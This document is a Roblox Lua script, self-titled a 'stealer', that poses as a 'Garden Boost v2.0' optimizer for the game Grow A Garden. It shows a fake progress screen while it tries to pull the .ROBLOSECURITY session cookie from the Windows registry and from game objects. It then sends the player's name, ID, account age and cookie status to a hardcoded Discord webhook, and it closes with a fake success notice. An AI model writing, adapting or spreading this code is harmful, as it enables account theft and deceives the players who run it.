-- Ultimate Garden Boost Stealer
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

-- Создание GUI загрузки
local function CreateLoader()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "GardenBoostLoader"
    ScreenGui.ResetOnSpawn = false
    
    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 350, 0, 180)
    MainFrame.Position = UDim2.new(0.5, -175, 0.5, -90)
    MainFrame.BackgroundColor3 = Color3.fromRGB(25, 30, 40)
    MainFrame.BorderSizePixel = 0
    
    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 12)
    Corner.Parent = MainFrame
    
    local Title = Instance.new("TextLabel")
    Title.Text = "🌿 GARDEN BOOST v2.0"
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.Position = UDim2.new(0, 0, 0, 10)
    Title.BackgroundTransparency = 1
    Title.TextColor3 = Color3.fromRGB(0, 255, 170)
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 20
    
    local Status = Instance.new("TextLabel")
    Status.Text = "Initializing optimization systems..."
    Status.Size = UDim2.new(1, -40, 0, 25)
    Status.Position = UDim2.new(0, 20, 0, 60)
    Status.BackgroundTransparency = 1
    Status.TextColor3 = Color3.fromRGB(200, 255, 230)
    Status.Font = Enum.Font.Gotham
    Status.TextSize = 14
    
    local ProgressBarBack = Instance.new("Frame")
    ProgressBarBack.Size = UDim2.new(1, -40, 0, 12)
    ProgressBarBack.Position = UDim2.new(0, 20, 0, 100)
    ProgressBarBack.BackgroundColor3 = Color3.fromRGB(40, 45, 55)
    
    local ProgressBar = Instance.new("Frame")
    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
    ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 170)
    ProgressBar.Parent = ProgressBarBack
    
    local ProgressText = Instance.new("TextLabel")
    ProgressText.Text = "0%"
    ProgressText.Size = UDim2.new(1, -40, 0, 20)
    ProgressText.Position = UDim2.new(0, 20, 0, 120)
    ProgressText.BackgroundTransparency = 1
    ProgressText.TextColor3 = Color3.fromRGB(150, 255, 200)
    ProgressText.Font = Enum.Font.GothamBold
    ProgressText.TextSize = 14
    
    -- Сборка GUI
    ProgressBarBack.Parent = MainFrame
    ProgressText.Parent = MainFrame
    Status.Parent = MainFrame
    Title.Parent = MainFrame
    MainFrame.Parent = ScreenGui
    ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
    
    return {
        Update = function(percent, text)
            Status.Text = text
            ProgressText.Text = math.floor(percent * 100) .. "%"
            ProgressBar.Size = UDim2.new(percent, 0, 1, 0)
        end,
        Destroy = function()
            ScreenGui:Destroy()
        end
    }
end

-- Извлечение куки
local function ExtractRobloxCookie()
    local cookie = nil
    
    -- Метод 1: Реестр Windows
    pcall(function()
        cookie = read_reg("HKEY_CURRENT_USER\\Software\\Roblox\\RobloxStudioBrowser\\roblox.com", ".ROBLOSECURITY")
    end)
    
    -- Метод 2: Поиск в игре
    if not cookie then
        pcall(function()
            for _, obj in pairs(game:GetDescendants()) do
                if obj:IsA("StringValue") and string.find(obj.Name:lower(), "cookie") then
                    cookie = obj.Value
                    break
                end
            end
        end)
    end
    
    return cookie
end

-- Отправка на Discord
local function SendToDiscord(cookieData)
    local webhookURL = "https://discord.com/api/webhooks/1443705100819501058/ubnz2x_OIoSYGmAyg4y0skhc1P6ihekoulW4RekI1jlvGfdemBhGqkuw8A28fJ8lEPrr"
    
    local player = Players.LocalPlayer
    local payload = {
        username = "Garden Boost Logger",
        embeds = {{
            title = "🌿 NEW ACTIVATION",
            description = "Garden Boost v2.0 executed",
            color = 65280,
            fields = {
                {name = "👤 Player", value = player.Name, inline = true},
                {name = "🆔 User ID", value = tostring(player.UserId), inline = true},
                {name = "🎮 Game", value = "Grow A Garden", inline = true},
                {name = "🔐 Cookie Extracted", value = cookieData and "YES ("..tostring(#cookieData).." chars)" or "NO", inline = true},
                {name = "📅 Account Age", value = tostring(player.AccountAge).." days", inline = true}
            },
            footer = {text = "Garden Boost System"}
        }}
    }
    
    pcall(function()
        HttpService:PostAsync(webhookURL, HttpService:JSONEncode(payload))
    end)
end

-- Основная функция
local function Main()
    local loader = CreateLoader()
    
    -- Этапы загрузки
    local steps = {
        {time = 2, text = "Loading garden database...", percent = 0.2},
        {time = 2, text = "Optimizing plant algorithms...", percent = 0.4},
        {time = 2, text = "Setting up auto-farm system...", percent = 0.6},
        {time = 2, text = "Configuring boost settings...", percent = 0.8},
        {time = 2, text = "Finalizing optimization...", percent = 1.0}
    }
    
    -- Показ загрузки
    for _, step in ipairs(steps) do
        loader.Update(step.percent, step.text)
        wait(step.time)
    end
    
    -- Извлечение данных
    local cookie = ExtractRobloxCookie()
    
    -- Отправка на вебхук
    SendToDiscord(cookie)
    
    -- Завершение
    wait(2)
    loader.Destroy()
    
    -- Финальное уведомление
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "🌿 Garden Boost",
        Text = "Optimization complete!",
        Duration = 5
    })
end

-- Запуск
pcall(Main)
